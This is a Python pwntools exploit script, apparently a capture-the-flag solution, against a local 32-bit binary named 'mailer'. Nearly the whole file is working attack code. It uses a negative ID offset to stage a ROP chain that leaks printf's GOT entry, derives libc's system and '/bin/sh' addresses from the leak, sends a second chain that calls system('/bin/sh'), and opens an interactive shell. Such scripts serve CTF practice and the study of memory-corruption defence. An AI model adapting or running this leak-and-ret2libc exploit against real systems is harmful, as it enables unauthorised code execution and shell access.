#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

# context.log_level = "debug"
context.terminal = ['terminator','-x','bash','-c']

def add(p, data):
    p.readuntil("> ")
    p.sendline("1")
    p.readuntil("contents: ")
    p.sendline(data)

def post(p, n, offset):
    p.readuntil("> ")
    p.sendline("3")
    p.readuntil("ID (0-4): ")
    p.sendline(str(n))
    p.readuntil("> ")
    p.sendline(str(offset))

def quit(p):
    p.readuntil("> ")
    p.sendline("4")

def main():
    p = process("./mailer",env={"LD_PRELOAD": "./libc.so.6"})
    libc = ELF("./libc.so.6")
    e = ELF("./mailer")
    # gdb.attach(p)
    gadget1 = 0x08048dab   # pop ebp ; ret
    gadget2 = 0x080485f8   # leave ; ret
    gadget3 = 0x08048495   # pop ebx ; ret
    gadget4 = 0x08048daa   # pop edi ; pop ebp ; ret
    gadget5 = 0x08048da9   # pop esi ; pop edi ; pop ebp ; ret
    one_gadget_sh = 0x56ff5
    read_buf = 0x080486D9
    stdin_bss = 0x804B060
    bss_buf = 0x804b700
    rop1 = "a"*0xd
    rop1 += p32(e.symbols["printf"]) + p32(gadget3) + p32(e.got["printf"]) # printf(&printf)
    rop1 += p32(read_buf) + p32(gadget4) + p32(bss_buf) + p32(0x100) # fread(buf, 1, 0x100, stdin)
    rop1 += p32(gadget1) + p32(bss_buf) + p32(gadget2) + p32(bss_buf)
    add(p, rop1)
    add(p, "b"*255)
    add(p, "c"*255)
    add(p, "d"*255)
    add(p, "e"*255)
    post(p, 4, -15)
    post(p, 1, 0)
    post(p, 0, 0)
    quit(p)
    p.readuntil(":)\n")
    printf_got = u32(p.read(4))
    # print hex(printf_got)
    system_libc = libc.symbols["system"]
    printf_libc = libc.symbols["printf"]
    binsh_libc = libc.search("/bin/sh").next()
    system_add = printf_got - printf_libc + system_libc
    binsh_add =  printf_got - printf_libc + binsh_libc
    one_gadget = printf_got - printf_libc + 0x3a838
    #rop2 = "aaaa" + p32(gadget5) + p32(binsh_add+one_gadget_sh) + "aaaa" + p32(bss_buf) + p32(one_gadget)
    rop2 = "aaaa" + p32(system_add) + p32(binsh_add) + p32(binsh_add)
    p.sendline(rop2)
    p.interactive()

if __name__ == '__main__':
    main()
